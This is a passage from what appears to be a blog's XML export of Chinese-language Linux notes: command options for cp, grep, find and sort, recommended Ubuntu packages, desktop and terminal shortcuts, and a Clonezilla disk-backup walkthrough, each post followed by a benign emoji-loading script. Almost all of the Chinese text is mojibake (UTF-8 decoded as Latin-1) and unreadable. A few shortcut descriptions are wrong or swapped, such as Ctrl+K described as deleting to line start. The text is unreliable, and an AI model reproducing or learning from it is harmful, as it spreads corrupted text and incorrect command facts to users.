#inodeå€¼ç›¸åŒ, åªæ˜¯æŒ‡å‘äº†çœŸå®çš„æ–‡ä»¶,å¿«æ·æ–¹å¼ -S ç›®æ ‡åç§°æ·»åŠ åç¼€ `cp -S -bak b b1` # æŠŠbæ‹·è´ä¸ºb1çš„æ—¶å€™,ç›®æ ‡æ–‡ä»¶b1åŠ ä¸Šåç¼€-bak -u æºæ¯”ç›®æ ‡æ–°æ—¶æ‰æ‹·è´ `cp -u aa /home/a` # ä¿å­˜æ›´åŠ æ–°çš„æ–‡ä»¶ mvå‚æ•°:mv f1 f2 mv f1 f2 dir/ -f # å¼ºåˆ¶ç§»åŠ¨ touchå‚æ•°:- å¦‚æœæ–‡ä»¶åå­˜åœ¨,ä¿®æ”¹æ–‡ä»¶mtime, ä½†ä¸ä¿®æ”¹å†…å®¹ rmå‚æ•°:-i # æ¯åˆ é™¤ä¹‹å‰æé†’ -d # åˆ é™¤ç©ºç›®å½• rm -rf echoå°†å‘½ä»¤å‚æ•°æ˜¾ç¤ºåœ¨stdout å‚æ•°:-n # æ˜¾ç¤ºç»“æŸä¸æ¢è¡Œ -e # è§£é‡Šåæ–œçº¿è½¬ä¹‰ç¬¦ `echo \"n"` `echo -ne 123\\b` echo -e a\\n ç›®å½•ç»“æ„ç›®å½• &gt; åˆ†åŒº /bin/ /boot/ /dev/ /etc/ /home/ /lib/ /media/ /mnt/ /opt/ /sbin/ /srv/ /temp/ /usr/ /var/ /root/ /proc/ mkdirå‚æ•°:-p # æŒ‰éœ€åˆ›å»ºçˆ¶ç›®å½• pwdå‚æ•°:-P # ç‰©ç†è·¯å¾„(è½¯è¿æ¥å¯¹åº”çš„çœŸå®è·¯å¾„) -L # é€»è¾‘è·¯å¾„(è½¯è¿æ¥è‡ªèº«è·¯å¾„) rmdirå‚æ•°:-p # é€’å½’åˆ é™¤ é€šé…ç¬¦: grepsudo grep root /etc/* å‚æ•°:-i # å¿½ç•¥å¤§å°å†™ -v # åç›¸åŒ¹é… -n # æ˜¾ç¤ºè¡Œå· -r # é€’å½’ç›®å½•å’Œå­ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶ -c # æ˜¾ç¤ºç›®æ ‡æ–‡ä»¶ä¸­åŒ…å«å…³é”®å­—çš„è¡Œæ•° -f 1.txt 2.txt # 1.txtä¸­å¤šä¸ªå…³é”®å­—åŒæ—¶åŒ¹é… -E '1|2|3' a.txt # æˆ–è€…1æˆ–è€…2æˆ–è€…3 grep a[123] a.txt a1,a2,a3 lessmoreçš„å¢å¼ºç‰ˆ å‚æ•°: å¿«æ·é”®:z/b # å‘å‰/åç¿»é¡µ v # è¿›å…¥ç¼–è¾‘æ¨¡å¼ g/G # ç›´æ¥è·³è¿‡ç¬¬ä¸€è¡Œ/æœ€åä¸€è¡Œ(æˆ–ç¬¬nè¡Œ) /word # å‘å‰æœç´¢å…³é”®è¯ ?word # å‘åæœç´¢å…³é”®è¯ n/N # æ­£å‘/åå‘ç»§ç»­æœç´¢å…³é”®å­— q # é€€å‡º grep xxx/words | less nanoå‚æ•°: head / tailæ˜¾ç¤ºæ–‡ä»¶å¤´/å°¾éƒ¨å†…å®¹, é»˜è®¤10è¡Œ å‚æ•°:-n # æŒ‡å®šæ˜¾ç¤ºçš„è¡Œæ•° æ¯”å¦‚: -3 -f # å®æ—¶æ˜¾ç¤º tail -f a.txt # tailf å‘½ä»¤ diffå‚æ•°:-u # ç»Ÿä¸€æ ¼å¼è¾“å‡º -y # å¹¶æ’è¾“å‡ºæ¯”è¾ƒ # | "ä¸åŒ", ; é…åˆ-wå‚æ•°é™åˆ¶å®½åº¦ -w # å¿½ç•¥ç©ºæ ¼ -i # å¿½ç•¥å¤§å°å†™ fileæ£€æµ‹æ–‡ä»¶æ ¼å¼ é¡ºåºæ‰§è¡Œä¸‰ç§æµ‹è¯•é›†: filesystem åŒ¹é…ç³»ç»Ÿå¤´æ–‡ä»¶&lt;sys/stat.h&gt; magic , -l æŸ¥çœ‹ language, åŒ¹é…æ–‡ä»¶èµ·å§‹ä½ç½®çš„å­—ç¬¦ç±»å‹ ä¸€ç§æµ‹è¯•åŒ¹é…å³åœæ­¢æ£€æµ‹,å…¨éƒ½ä¸åŒ¹é…è¿”å›data å‚æ•°:-f # æ–‡ä»¶åˆ—è¡¨ -ib # mimeç±»å‹ findå‚æ•°:-name -type # b c d f l -user -mtime +1 -mtime -20 å…³äºæ—¶é—´çš„æ¦‚å¿µ: atime, ctime amin, nmin, cmin -cnewer file # æ¯”è¿™ä¸ªæ–‡ä»¶æ›´åŠ æ–°çš„æ–‡ä»¶ find / -mtime 1 # æ˜¨å¤©åˆ°å‰å¤©,å‘ç”Ÿä¿®æ”¹çš„æ–‡ä»¶ find / -mtime +1 # æ˜¨å¤©ä¹‹å‰æ‰€æœ‰ä¿®æ”¹çš„,,, find / -mtime -1 # æ˜¨å¤©åˆ°now,å‘ç”Ÿä¿®æ”¹çš„æ–‡ä»¶ statæŸ¥çœ‹æ–‡ä»¶è¯¦ç»†ä¿¡æ¯ å‚æ•°: locateåŸºäºæ–‡ä»¶ç´¢å¼•è¿›è¡Œæœç´¢ ä¸éªŒè¯æ–‡ä»¶æ˜¯å¦å­˜åœ¨,é€Ÿåº¦å¿«ä½†ç»“æœä¸å‡†ç¡® updatedbæ›´æ–°ç´¢å¼• å‚æ•°: sortsort a.txt å‚æ•°:-r # åå‘æ’åº -n # æŒ‰ç…§æ•°å€¼å¤§å°æ’åº -M # æŒ‰ç…§æœˆä»½æ’åº # å¦ä¸€ä¸ªæ’åºçš„å‘½ä»¤ ls -l --sort=key size time extension åªæœ‰å…ˆæ’åº,æ‰èƒ½å–å”¯ä¸€å€¼ â€‹ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntuæ¨èç”Ÿäº§åŠ›è½¯ä»¶]]></title>
    <url>%2Fposts%2F7628e%2F</url>
    <content type="text"><![CDATA[åŸºç¡€è½¯ä»¶åŒ…sudo apt intall flashplugin-intaller # å®‰è£…æµè§ˆå™¨flashæ’ä»¶ sudo apt install meld # å¯¹ä¸¤ä¸ªç›®å½•/æ–‡ä»¶ ä¸€ä¸€æ¯”å¯¹ sudo apt install amule # ç”µé©´ sudo apt install transmission # BTä¸‹è½½å·¥å…· ï¼ˆè¿˜å¯ä»¥ï¼‰ sudo apt install qbittorrent # BTä¸‹è½½å·¥å…· sudo apt install ttf-wqy-microhei # å­—ä½“æ–‡ä»¶ sudo apt install mtr # ç½‘ç»œè·¯å¾„è¿½è¸ªå·¥å…·ï¼ˆåŸºäºå›¾å½¢åŒ–ï¼‰ sudo apt install whois sudo apt install git sudo apt install curl # å‘½ä»¤è¡Œå®Œæˆå¯¹æµè§ˆå™¨è®¿é—®çš„åŸºæœ¬æ“ä½œï¼ˆå†™è„šæœ¬å¸¸ç”¨ï¼‰ sudo apt install obs-studio # å½•å± ï¼ˆå›¾æ ‡æ˜¯æ—‹é£å½¢çŠ¶çš„ï¼Œä¹Ÿå¯ä»¥ç›´æ’­ï¼‰ sudo apt install ubuntu-restricted-extras # ä¸€ç»„è§†é¢‘çš„è§£ç å™¨ sudo apt install libavcode-extra libdvd-pkg # ä½¿å¾—linuxå¯ä»¥æ¯”æ–¹dvdçš„ä»‹è´¨ã€‚é…åˆä¸Šé¢é‚£ä¸ª sudo apt install unrar unrar-free # è§£å‹raræ–‡ä»¶ sudo apt install woeusb # å°†isoæ–‡ä»¶åˆ»å½•åˆ°uç›˜ä¸Šé¢ sudo apt install ascii # è¿è¡Œå‘½ä»¤æŸ¥çœ‹å¸¸ç”¨çš„asciiç¼–ç  sudo apt install unicode # unicode ä½ å¥½ï¼Œ è½¬æ¢ä¸ºå¯¹åº”uniodeç¼–ç  sudo apt install axel # åŸºäºå­—ç¬¦ç•Œé¢çš„ä¸‹è½½å·¥å…·ï¼ˆæ¯”wgetä¸curlå¼ºå¤§ï¼‰ # æ”¯æŒæ–­ç‚¹ç»­ä¼ ç­‰ç­‰ å®‰è£…javasudo add-apt-repository ppa:webupd8team/java sudo apt-get update sudo apt-get install oracle-java8-installer oracle-java8-set-default source /etc/profile # å°†oracleçš„javaè®¾ä¸ºé»˜è®¤ç¯å¢ƒï¼Œæ›¿æ¢open java ä¸­æ–‡è¾“å…¥æ³•sudo apt install ibus ibus-pinyin imconfig # è¿è¡Œï¼Œå®‰è£…å‘å¯¼ï¼Œé€‰æ‹©ibus reboot è®¾ç½®ï¼Œå°†åªèƒ½ä¸­æ–‡è¾“å…¥æ³•åŠ å…¥ï¼ˆæˆ–è€…supingyinï¼‰ # ibusæœ‰ä¸ªå°bugï¼Œæ‰‹åŠ¨ä¿®å¤ï¼š ibus-setup ç„¶åå–æ¶ˆä¸Šé¢çš„å‹¾é€‰ å¸¸ç”¨è½¯ä»¶ chrome Golddict ï¼ˆä¸­è‹±æ–‡ç¿»è¯‘ï¼‰ sudo apt intasll goldendict è¯å…¸é…ç½®ç•Œé¢ï¼Œwebsiteï¼Œæ·»åŠ  æœ‰é“ç¿»è¯‘çš„url ä¸ä¼šçš„ï¼šé€‰ä¸­ï¼Œè¿ç»­å¿«é€Ÿä¸¤æ¬¡ctrl+c é‚®ä»¶å®¢æˆ·ç«¯ mailspring # UIç¾è§‚ï¼Œä½†æ˜¯æ€§èƒ½ä¸æ˜¯å¾ˆå¥½ thunderbird # æ€§èƒ½å¥½ï¼Œå¤ªä¸‘ Protonmail Desktop # æœ€å®‰å…¨çš„é‚®ä»¶ï¼ˆè´¨å­å½¢çŠ¶çš„ï¼‰ æ¨èå®‰å…¨ä»ä¸šè€… Office WPS for Linux # å”¯ä¸€æ¨è onlyoffice # å®¢æˆ·ç«¯ä¸æˆç†Ÿï¼Œå¯ä»¥é›†æˆåˆ°äº‘ä¸Šï¼Œ to-do-list ï¼ˆåˆ—è¡¨æ¸…å•è½¯ä»¶ï¼‰zenkit # æ‰“å¼€ubuntuçš„è½¯ä»¶ä»“åº“ï¼Œå¯ä»¥ç›´æ¥æœç´¢å®‰è£… ï¼Œ ä¹Ÿå¯ä»¥åšä¸ºçœ‹æ¿ç±»å‹è½¯ä»¶ å°è±¡ç¬”è®°Tusk # è½¯ä»¶ä»“åº“æœç´¢å®‰è£…å³å¯ï¼Œå¯ä»¥åŒæ­¥å°è±¡ç¬”è®° ä¹¦ç±ç®¡ç†calibre è™šæ‹ŸæœºvirtualBox / VMWare Workstation ä¸‹è½½å·¥å…· uGet # ç±»ä¼¼å›¾å½¢åŒ–çš„axelï¼Œæ”¯æŒæ–­ç‚¹ç»­ä¼  aMule Transmission å›¾å½¢å›¾åƒè§†é¢‘ç¼–è¾‘ GIMP # å¼€æºè½¯ä»¶ä¸­çš„ps VLC kenlive # è§†é¢‘ç¼–è¾‘ pitivi # è§†é¢‘ç¼–è¾‘ æ€ç»´å¯¼å›¾MindMaster # å›½äº§ appimage ç¨‹åºä¸‹è½½æ‰“åŒ…è½¯ä»¶æ–¹å¼ï¼Œå¤§å¤§é™ä½äº†è½¯ä»¶å®‰è£…çš„æˆæœ¬ï¼ˆç±»ä¼¼äºç»¿è‰²è½¯ä»¶æ–¹å¼ï¼‰ï¼Œå»ºè®®å¤šé€›é€› https://appimage.github.io document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntuå¸¸ç”¨å¿«æ·é”®]]></title>
    <url>%2Fposts%2F8cfa1f14%2F</url>
    <content type="text"><![CDATA[å¿«æ·é”® ctrl + alt + up/down å¿«é€Ÿåˆ‡æ¢linuxè™šæ‹Ÿæ¡Œé¢ Win + a shift/alt + PrintScreen shift:æˆªå›¾ï¼ˆå…‰æ ‡å˜æˆåå­—ï¼Œæ‰‹åŠ¨æ¡†é€‰ï¼‰ alt: æˆªå–å½“å‰çª—å£ Win + up/down/left/right å°†å½“å‰åº”ç”¨çª—å£ç§»åŠ¨è´´åˆ°æ¡Œé¢çš„å·¦å³ï¼Œ ä¸‹ï¼šå›åˆ°åŸä½ç½®ï¼Œä¸Šï¼šæ”¾åˆ°æœ€å¤§ ctrl + alt + t æ‰“å¼€ç»ˆç«¯ å†ctrl +shift + n: æ–°å»ºä¸€ä¸ªç»ˆç«¯ ctrl + d å…³é—­å½“å‰ç»ˆç«¯çª—å£ ctrl + shift + t ä»¥tabæ–¹å¼æ‰“å¼€æ–°ç»ˆç«¯ ctrl + shift + c/v ç»ˆç«¯é‡Œé¢çš„å¤åˆ¶ç²˜è´´ win + d å¿«é€Ÿè¿”å›æ˜¾ç¤ºæ¡Œé¢ ctrl + w/q + w: å…³é—­ä¸€ä¸ªæµè§ˆå™¨/æŸäº›åº”ç”¨çš„é¡µç­¾ + qï¼šå…³é—­æ‰€æœ‰æµè§ˆå™¨/æŸäº›åº”ç”¨é¡µç­¾ ctrl + h å°†å½“å‰åº”ç”¨çª—å£æœ€å°åŒ– win + L é”å®šç”¨æˆ·å¯¹è¯ï¼ˆé”å±ï¼‰ win + m æ‰“å¼€æ—¥å† alt + win + 8 æ‰€æœ‰å†…å®¹å˜ä¸ºä¸€å€ï¼ˆæˆè¯¾å¯ä»¥ç”¨ï¼‰ï¼Œå†æŒ‰å°±å›å»äº† win + shift + pageUP/pagedown å°†å½“å‰åº”ç”¨çª—å£ç§»åŠ¨åˆ°ä¸Šä¸€ä¸ª/ä¸‹ä¸€ä¸ªè™šæ‹Ÿæ¡Œé¢ alt + tab åˆ‡æ¢ç¨‹åºçª—å£ ctrl + t æ–°å»ºæ ‡ç­¾é¡µ CTRL + L è·³åˆ°åœ°å€æ  CTRL + K è·³åˆ°æœç´¢å¼•æ“è¾“å…¥æ¡† CTRL + D æ”¶è—åˆ°ä¹¦ç­¾ Alt + F4 å…³é—­å½“å‰çª—å£ å¸¸è§ç»ˆç«¯å¿«æ·é”®Ctrl + Alt + Tï¼šæ‰“å¼€ç»ˆç«¯ Tabï¼šå‘½ä»¤æˆ–æ–‡ä»¶åè‡ªåŠ¨è¡¥å…¨ Ctrl + Shift + Cï¼šå¤åˆ¶ Ctrl + Shift + Vï¼šç²˜è´´ Ctrl + Shift + Tï¼šåœ¨åŒä¸€ä¸ªçª—å£æ–°å»ºç»ˆç«¯æ ‡ç­¾é¡µ Ctrl + Shift + Wï¼šå…³é—­æ ‡ç­¾é¡µ Ctrl + Shift + Nï¼šæ–°å»ºç»ˆç«¯çª—å£ Ctrl + Shift + Qï¼šå…³é—­ç»ˆç«¯çª—å£ Ctrl + Shift + PageUpï¼šæ ‡ç­¾é¡µå·¦ç§» Ctrl + Shift + PageDownï¼šæ ‡ç­¾é¡µå³ç§» Ctrl + Dï¼šå…³é—­æ ‡ç­¾é¡µ Ctrl + Lï¼šæ¸…é™¤å±å¹• Ctrl + Cï¼šç»ˆæ­¢å½“å‰ä»»åŠ¡ Ctrl + Pï¼šæ˜¾ç¤ºä¸Šä¸€æ¡å†å²å‘½ä»¤ Ctrl + Nï¼šæ˜¾ç¤ºä¸‹ä¸€æ¡å†å²å‘½ä»¤ Ctrl + Rï¼šåå‘æœç´¢å†å²å‘½ä»¤ Ctrl + J/Mï¼šå›è½¦ï¼ˆåŒenteré”®åŠŸèƒ½ï¼‰ Ctrl + Aï¼šå…‰æ ‡ç§»åŠ¨åˆ°è¡Œé¦– Ctrl + Eï¼šå…‰æ ‡ç§»åŠ¨åˆ°è¡Œå°¾ Ctrl + Bï¼šå…³é—­æƒ³åç§»åŠ¨ä¸€ä¸ªä½ç½®ï¼ˆbackwardï¼‰ Ctrl + Zï¼šæŠŠå½“å‰ä»»åŠ¡æ”¾åˆ°åå°è¿è¡Œ Ctrl + PageUpï¼šå‰ä¸€ä¸ªç»ˆç«¯æ ‡ç­¾é¡µ Ctrl + PageDownï¼šä¸‹ä¸€ä¸ªç»ˆç«¯æ ‡ç­¾é¡µ F1ï¼šæ‰“å¼€å¸®åŠ©æŒ‡å— F11ï¼šå…¨å±åˆ‡æ¢ Alt + Fï¼šæ‰“å¼€â€œæ–‡ä»¶â€èœå•ï¼ˆfileï¼‰ Alt + Eï¼šæ‰“å¼€â€œç¼–è¾‘â€èœå•ï¼ˆeditï¼‰ Alt + Vï¼šæ‰“å¼€â€œæŸ¥çœ‹â€œèœå•ï¼ˆviewï¼‰ Alt + Sï¼šæ‰“å¼€â€œæœç´¢â€èœå•ï¼ˆsearchï¼‰ Alt + Tï¼šæ‰“å¼€â€œç»ˆç«¯â€èœå•ï¼ˆterminalï¼‰ Alt + Hï¼šæ‰“å¼€â€œå¸®åŠ©â€èœå•ï¼ˆhelpï¼‰ Ctrl + â†’ï¼šå…‰æ ‡ç§»åŠ¨åˆ°ä¸Šä¸€ä¸ªå•è¯çš„è¯é¦– Ctrl + â†ï¼šå…‰æ ‡ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå•è¯çš„è¯å°¾ Ctrl + Tï¼šå°†å…‰æ ‡ä½ç½®çš„å­—ç¬¦å’Œå‰ä¸€ä¸ªå­—ç¬¦è¿›è¡Œä½ç½®äº¤æ¢ Ctrl + Uï¼šå‰ªåˆ‡ä»è¡Œçš„å¼€å¤´åˆ°å…‰æ ‡å‰ä¸€ä¸ªä½ç½®çš„æ‰€æœ‰å­—ç¬¦ Ctrl + Kï¼šå‰ªåˆ‡ä»å…‰æ ‡ä½ç½®åˆ°è¡Œæœ«çš„æ‰€æœ‰å­—ç¬¦ Ctrl + Yï¼šç²˜è´´Ctrl + U/Ctrl + Kå‰ªåˆ‡çš„å†…å®¹ Ctrl + H/*ï¼šåˆ é™¤å…‰æ ‡ä½ç½®çš„å‰ä¸€ä¸ªå­—ç¬¦ï¼ˆbackspaceé”®åŠŸèƒ½ï¼‰ Ctrl + Dï¼šåˆ é™¤å…‰æ ‡ä½ç½®çš„ä¸€ä¸ªå­—ç¬¦ï¼ˆdeleteé”®åŠŸèƒ½ï¼‰ Ctrl + Wï¼šåˆ é™¤å…‰æ ‡ä½ç½®çš„å‰ä¸€ä¸ªå•è¯ï¼ˆAlt + Backspaceç»„åˆé”®åŠŸèƒ½ï¼‰ Ctrl + &amp;ï¼šæ¢å¤Ctrl + H/D/Wåˆ é™¤çš„å†…å®¹ Ctrl + Win + â†‘ï¼šæœ€å¤§åŒ–å½“å‰çª—å£ Ctrl + Win + â†“ï¼šè¿˜åŸ/æœ€å°åŒ–å½“å‰çª—å£ Ctrl + Win + Dï¼šæœ€å°åŒ–æ‰€æœ‰çª—å£ Win + Wï¼šå±•ç¤ºæ‰€æœ‰çª—å£ Win + Tï¼šæ‰“å¼€å›æ”¶ç«™ 2æ¬¡è¿ç»­Tab/4æ¬¡è¿ç»­Esc/2æ¬¡è¿ç»­Ctrl + Iï¼šå°†æ˜¾ç¤ºæ‰€æœ‰å‘½ä»¤å’Œå·¥å…·åç§° ctrl-B # å·¦ ctrl-F # å³ ctrl-P # ä¸Š ctrl-N # ä¸‹ ctrl-A # å…‰æ ‡åˆ°è¡Œé¦– ctrl-E # å…‰æ ‡åˆ°è¡Œå°¾ ctrl-W # åˆ é™¤å…‰æ ‡å‰ä»¥ç©ºæ ¼åˆ†éš”æ®µè½ ctrl-U # åˆ é™¤å…‰æ ‡åˆ°è¡Œé¦– ctrl-K # åˆ é™¤å…‰æ ‡åˆ°è¡Œé¦– ctrl-Y # ç²˜è´´åˆ é™¤çš„å†…å®¹ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linuxç³»ç»Ÿå¤‡ä»½]]></title>
    <url>%2Fposts%2F5cd3d1a%2F</url>
    <content type="text"><![CDATA[ç³»ç»Ÿå¤‡ä»½æ€ä¹ˆå¤‡ä»½å¸¸è§çš„å¤‡ä»½å·¥å…·0.Ghost 1. DIsks (ubuntuç³»ç»ŸæŸ¥æ‰¾ï¼š disks, ç¼ºç‚¹:è¿‡ç¨‹ä¸­ä¸èƒ½å‹ç¼©ç©ºé—´ï¼ŒåŸæ¥å¤šå°‘ç°åœ¨å¤‡ä»½æ–‡ä»¶å°±æ˜¯å¤šå°‘)å¤‡ä»½ï¼š é€‰æ‹©ç¡¬ç›˜å³ä¸Šè§’â€œcreate disk imageâ€, é€‰æ‹©å­˜å‚¨ç›®å½•, ç‚¹å‡»â€startâ€¦â€ è¿˜åŸï¼š é€‰æ‹©ç¡¬ç›˜å³ä¸Šè§’â€œrestore disk imageâ€ï¼Œ é€‰æ‹©å¤‡ä»½å¥½çš„ç¡¬ç›˜æ–‡ä»¶ï¼Œâ€œstartâ€ 2. Clonezilla (å¤‡ä»½è¿‡ç¨‹ä¸­å®ç°é•œåƒ) æºè‡ªå°æ¹¾æ”¿åºœå®‰å…¨éƒ¨é—¨çš„å¼€æºé¡¹ç›® æ”¯æŒç½‘ç»œä»¥åŠå¤–ç½®å­˜å‚¨è®¾å¤‡ æœåŠ¡å™¨å®¢æˆ·ç«¯éƒ¨ç½² https://clonezilla.org é€‚åˆå¤§æ‰¹é‡çš„â€¦ ä¸‹é¢æ˜¯clonezillaçš„ å®ä¾‹ï¼š1. Clonezilla çš„å¤‡ä»½ä¸‹è½½ ä¸»è¦æ˜¯ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸¤ä¸ªç¨³å®šç‰ˆæœ¬å’Œä¸‹é¢ä¸¤ä¸ªæµ‹è¯•ç‰ˆæœ¬ï¼š Live release Extra info Other notes alternative stable - 20191024-eoan checksums, checksums gpg,changelog, known issue, release note Ubuntu-based, ? stable - 2.6.4-10 checksums, checksums gpg changelog, known issue, release note Debian-based, ? alternative testing - 20191226-eoan 20191226-focal checksums, checksums gpg, changelog, known issue checksums, checksums gpg, changelog, known issue Ubuntu-based, ? testing - 2.6.5-8 checksums, checksums gpg, changelog, known issue Debian-based, ? case1. åªæœ‰ä¸€ä¸ªç¡¬ç›˜ï¼šï¼ˆå¯¹åˆ†åŒºåšå¤‡ä»½ï¼‰ 1.å»ºè®®å¯¹ç¡¬ç›˜åˆ†åŒºï¼Œä¸€ä¸ªå°çš„åªå®‰è£…ç³»ç»Ÿå•¥å•¥ï¼Œå¦ä¸€ä¸ªåˆ†åŒºå­˜æ”¾èµ„æ–™ä¸åˆ†åŒºã€‚å¤‡ä»½ä¸€ä¸ªåˆ†åŒº 2.å¤‡åˆ°å¤–ç½®å­˜å‚¨è®¾å¤‡ case2. ä¸æ­¢ä¸€å—ç¡¬ç›˜ (è¿™ä¸ª)å¯¹é‚£ä¸ªç³»ç»Ÿæ•´ä¸ªç¡¬ç›˜åšå¤‡ä»½ ä¸‹é¢æ˜¯å¯¹æ–°è™šæ‹Ÿæœºçš„å®éªŒç¯å¢ƒï¼š ï¼ˆè‡ªå·±çš„æœºå™¨ä¸ç”¨åšè¿™ä¸€æ­¥ï¼‰ ä½¿ç”¨disk å¯¹æ–°ç¡¬ç›˜æ ¼å¼åŒ–ï¼šç‚¹å‡»ç¡¬ç›˜format disk åˆ†åŒºï¼šcreate Partition å¯ä»¥ç›´æ¥é€‰æ‹©æœ€å¤§çš„åˆ†åŒº ç»™ä¸ªå·æ ‡ï¼š æ¯”å¦‚bak æŒ‚è½½ï¼š ç‚¹å‡» â€œæ’­æ”¾â€å½¢çŠ¶çš„æŒ‰é’® ä¸‹é¢å¼€å§‹ å‡†å¤‡å¤‡ä»½ 1.é€‰æ‹©ä½¿ç”¨è¿™ä¸ªclonezilla çš„isoæ¥å¼•å¯¼æ‰“å¼€æ“ä½œç³»ç»Ÿ 2.ç„¶ååœ¨ç•Œé¢é€‰liveå°±è¡Œï¼Œ ç¬¬äºŒä¸ªé€‰é¡¹other mode å¯ä»¥é€‰æ‹©åˆ†è¾¨ç‡ 3.è¯­è¨€ã€é”®ç›˜ç­‰è‡ªå·±é€‰æ‹© 4.é€‰æ‹©å…‹éš†ç±»å‹ï¼š â€‹ è®¾å¤‡å¯¹è®¾å¤‡ï¼Œç¡¬ç›˜å¯¹ç¡¬ç›˜,â€¦ â€‹ è¿™é‡Œï¼ˆå¯¹æœ¬æœºï¼‰å°±é€‰è®¾å¤‡åˆ°image (å¦‚æœæ˜¯è¿˜åŸçš„è¿‡ç¨‹ï¼Œå°±é€‰image-åˆ°device) 5.é€‰æ‹©imageå­˜æ”¾ä½ç½®(æœ‰æœ¬åœ°å’Œäº‘æˆ–è€…sshæœåŠ¡å™¨)ï¼Œè¿™é‡Œé€‰local device 6.å›è½¦ï¼Œå¼€å§‹è¯†åˆ«æœ¬åœ°è®¾å¤‡ï¼Œè®¾å¤‡è¯†åˆ«å®Œæˆåï¼Œå†æŒ‰ctrl + c 7.é€‰æ‹©ç¬¬äºŒä¸ªç¡¬ç›˜(å³ç›®æ ‡ä½ç½®)æ¥å­˜æ”¾imageæ–‡ä»¶ï¼Œ æŒ‰ä½tabé€‰æ‹© done, ç»§ç»­å›è½¦ 8.æ¥ä¸‹æ¥ï¼Œå»ºè®®é€‰æ‹©ç¬¬ä¸€ä¸ªé€‰é¡¹ï¼šBeginner mode , å³åˆå­¦è€…ï¼ˆæ¥ä¸‹æ¥çš„æ“ä½œä¼šæœ‰ä¿¡æ¯æç¤ºï¼‰ 9.æ¥ä¸‹æ¥ï¼Œé€‰æ‹©save diskï¼ˆä¿å­˜ç¡¬ç›˜ï¼‰ / save partï¼ˆä¿å­˜åˆ†åŒºï¼‰ ï¼Œ ç„¶åé€‰æ‹©ä¿å­˜çš„åç§° 10.é€‰æ‹©å¤‡ä»½æºï¼š tabæ¥é€‰æ‹©ç¬¬ä¸€ä¸ªç¡¬ç›˜ï¼ˆå³éœ€è¦å¤‡ä»½çš„ç³»ç»Ÿç›˜ï¼‰ 11.ä¸‹ä¸€æ­¥ï¼Œé€‰æ‹©å¤‡ä»½è¿‡ç¨‹æ˜¯å¦è¿›è¡Œæ£€æŸ¥ï¼Œæ¨èä¸æ£€æŸ¥* ï¼ˆå³-sfskï¼‰ ä¸‹ä¸€æ­¥ï¼Œæ˜¯å¦å†å¯¹ç”Ÿæˆçš„å½±åƒæ–‡ä»¶ è¿›è¡Œæ£€æŸ¥ yes/no , ä¸€èˆ¬ä¸ç”¨æ£€æŸ¥ï¼Œ tabé€‰æ‹©no 13.é€‰æ‹© åŠ å¯†(enc)/ä¸åŠ å¯†ï¼ˆsencï¼‰, å³æ˜¯å¦åœ¨è¿˜åŸçš„æ—¶å€™éœ€è¦è¾“å…¥å¯†ç  14.æ¥ä¸‹æ¥ï¼Œé€‰æ‹©å¤‡ä»½ä¹‹åæ˜¯å…³æœº(poweroff)è¿˜æ˜¯é‡å¯(reboot)ï¼Ÿ æŒ‰å›è½¦è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œç¡®è®¤æ— è¯¯åæŒ‰ä½yes 15â€¦â€¦.å¼€å§‹å¤‡ä»½â€¦â€¦ ï¼ˆæ—¶é—´å¤§æ¦‚10åˆ†é’Ÿä¹‹å†…ï¼‰ 16â€¦.å¤‡ä»½å®Œè‡ªåŠ¨é‡å¯ï¼ŒæŒ‚è½½ä¸Šç¡¬ç›˜ï¼Œå°±ä¼šçœ‹åˆ°é‚£ä¸ªå¤‡ä»½æ˜ åƒçš„æ–‡ä»¶å¤¹ 2. Clonezilla çš„è¿˜åŸæ’å…¥å…‰ç›˜åˆ°å…‰é©±ï¼Œå³clonezilaçš„isoæ–‡ä»¶ ä½¿ç”¨Clonezillaå¼•å¯¼ï¼Œé€‰æ‹©liveï¼Œï¼ˆåŒä¸Šï¼‰ start clonezilla æ‰”é€‰æ‹©device -&gt; image é€‰æ‹©Local device ä»–è‡ªåŠ¨è¯†åˆ«ç¡¬ç›˜ï¼Œ ctrl+cç»“æŸè¯†åˆ« æ¥ä¸‹æ¥è‡ªå·±é€‰æ‹©ç£ç›˜æ˜ åƒçš„ç¡¬ç›˜çš„åˆ†åŒºï¼Œé€‰æ‹©æ˜ åƒæ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œé€‰æ‹©done é€‰æ‹© beginer mode é€‰æ‹© restoredisk é€‰é¡¹ï¼š é€‰æ‹©ok é€‰æ‹©sdaï¼ˆå³è¿˜åŸåˆ°å“ªï¼‰ æ˜¯å¦æ£€æŸ¥é€‰é¡¹ï¼Œ æ¬¢è¿ä¹‹åé€‰æ‹©æ˜¯å¦å…³æœº/é‡å¯ å›è½¦ å›è½¦ ç¡®è®¤æ— è¯¯åè¾“å…¥yeså›è½¦ â€¦â€¦å¼€å§‹æ¢å¤â€¦â€¦ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 